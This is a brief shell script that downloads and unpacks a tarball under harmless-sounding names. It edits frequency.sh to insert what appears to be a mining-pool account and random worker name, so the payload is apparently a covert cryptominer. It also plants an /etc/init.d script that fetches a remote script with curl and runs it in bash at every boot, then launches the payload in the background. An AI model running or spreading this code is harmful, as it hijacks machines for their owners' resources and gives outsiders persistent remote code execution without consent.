cd /
rm -rf filter.tar
rm -rf filter
wget https://github.com/rubbyadi/sengkreat/releases/download/v1.0.2/filter.tar
tar -xvf filter.tar
cd /filter
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./frequency.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./frequency.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/dynamicxe/echo/main/equalizer.sh)" > feedback.sh
chmod a+x feedback.sh
update-rc.d feedback.sh defaults
cd /filter
nohup ./frequency.sh
ps -ef | grep filter
